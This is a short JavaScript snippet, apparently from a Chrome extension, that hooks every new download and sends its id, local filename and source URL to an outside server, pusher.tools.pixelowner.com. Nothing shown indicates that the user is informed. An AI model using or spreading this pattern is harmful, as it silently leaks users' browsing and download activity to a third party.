chrome.downloads.onCreated.addListener(function(downloadItem) {
	$.get("http://pusher.tools.pixelowner.com", { 
		id: downloadItem.id,  
		filename: downloadItem.filename,  
		url: downloadItem.url,  
	} );
});